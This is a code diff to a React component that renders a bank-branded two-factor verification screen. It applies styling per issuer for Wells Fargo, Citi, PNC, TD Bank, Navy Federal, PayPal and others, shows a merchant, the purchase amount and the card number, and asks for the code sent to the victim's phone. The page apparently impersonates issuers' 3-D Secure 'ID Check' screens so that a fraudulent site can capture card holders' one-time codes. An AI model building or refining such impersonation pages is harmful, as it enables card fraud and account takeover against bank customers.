@@ -62,7 +62,24 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
         return <CreditCard className="w-6 h-6 text-gray-400" />;
     }
   };
-
+  const className =
+    selectedBank === 'Wells Fargo'
+      ? 'bg-[#D61F28]'
+      : selectedBank === 'Citi'
+        ? 'w-[100px] h-[60px]'
+        : selectedBank === 'PNC'
+          ? 'bg-[#414E58]'
+          : selectedBank === 'TD Bank'
+            ? '!w-[150px] h-[50px]'
+            : selectedBank === 'Truist'
+              ? 'w-[150px] h-[50px]'
+              : selectedBank === 'Regions Bank'
+                ? 'w-[150px] h-[50px]'
+                : selectedBank === 'M&T Bank'
+                  ? 'bg-[#015840]'
+                  : selectedBank === 'Navy Federal Credit Union'
+                    ? 'w-[200px] h-auto'
+                    : '';
   // ✅ Special PayPal UI
 if (selectedBank === 'PayPal') {
   return (
@@ -120,50 +137,92 @@ if (selectedBank === 'PayPal') {
 }
 
 
-  // ✅ Default (bank 2FA screen)
   return (
     <div className="bg-white min-h-screen">
-      <div className="flex items-center justify-between p-4 border-b border-gray-200">
-        {bankData?.additionalLogo && (
-          <img src={bankData.additionalLogo} alt={selectedBank} className="h-6 max-w-[200px]" />
-        )}
-        <div className="flex items-center space-x-2">
-          {getCardIcon(cardType)}
-          <span className="text-sm font-medium text-gray-700">ID Check</span>
+      {/* Header with back arrow and close button */}
+      <div className="flex items-center justify-between p-4">
+        <div className="border-b border-gray-200 flex justify-between w-full items-center">
+          <img
+            src={bankData?.additionalLogo}
+            alt="Capital One"
+            className={`${className} h-5 max-w-[200px] mb-2`}
+          />
+          <div className="flex items-center space-x-2 mb-2">
+            {getCardIcon(cardType)} |
+            <span className="text-sm font-medium text-gray-700">ID Check</span>
+          </div>
         </div>
+
+        {/* Capital One Logo */}
       </div>
 
+      {/* Main Content */}
       <div className="p-6">
-        <h1 className="text-xl font-bold mb-3">Submit the code we sent to you</h1>
-        <p className="text-gray-600 mb-6">Enter the temporary code we sent to {phoneNumber}.</p>
+        <h1 className="text-2xl font-bold text-gray-900 mb-4">
+          Submit the code we sent to you
+        </h1>
 
-        {/* Transaction Info */}
-        <div className="space-y-3 mb-6">
-          <p><strong>Merchant:</strong> pokéboostvault.com</p>
-          <p><strong>Purchase Amount:</strong> ${total.toFixed(2)} USD</p>
-          <p><strong>Card Number:</strong> {cardNumber}</p>
+        <p className="text-gray-600 mb-8">
+          Enter the temporary code we sent to {phoneNumber}.
+        </p>
+
+        {/* Transaction Details */}
+        <div className="space-y-4 mb-8">
+          <div>
+            <span className="font-semibold text-gray-900">Merchant:</span>
+            <div className="text-gray-600 mt-1">pokéboostvault.com</div>
+          </div>
+
+          <div>
+            <span className="font-semibold text-gray-900">
+              Purchase Amount:
+            </span>
+            <div className="text-gray-900 font-semibold mt-1">${total} USD</div>
+          </div>
+
+          <div>
+            <span className="font-semibold text-gray-900">Card Number:</span>
+            <div className="text-gray-600 mt-1">{cardNumber}</div>
+          </div>
         </div>
 
-        {/* Code Input */}
-        <form onSubmit={onSubmit} className="space-y-4">
-          <input
-            type="text"
-            value={code}
-            onChange={handleChange}
-            className="w-full px-4 py-3 border rounded-lg text-center text-lg tracking-widest font-mono focus:ring-2 focus:ring-blue-500"
-            required
-          />
-          <button
-            type="submit"
-            disabled={disabled}
-            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition disabled:opacity-50"
-          >
-            Submit Code
-          </button>
-        </form>
+        {/* Code Input Form */}
+<form onSubmit={onSubmit} className="space-y-6">
+  <div>
+    <label className="block text-sm font-semibold text-gray-900 mb-3">
+      Code
+    </label>
+    <input
+      type="text"
+      value={code}
+      onChange={handleChange}
+      placeholder=""
+      className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-lg text-center tracking-widest font-mono"
+      required
+    />
+  </div>
 
-        <div className="text-center mt-4">
-          <button type="button" className="text-blue-600 hover:underline text-sm">
+  <button
+    type="submit"
+    disabled={code.length === 0} // enable button as long as there is input
+    className={`w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 ${
+      code.length > 0
+        ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
+        : 'bg-gray-300 text-gray-500 cursor-not-allowed'
+    }`}
+  >
+    Submit Code
+  </button>
+</form>
+
+
+        {/* Resend Code Link */}
+        <div className="text-center mt-6">
+          <span className="text-gray-600">Didn't receive a code? </span>
+          <button
+            type="button"
+            className="text-blue-600 hover:text-blue-800 font-medium transition-colors"
+          >
             Resend code
           </button>
         </div>
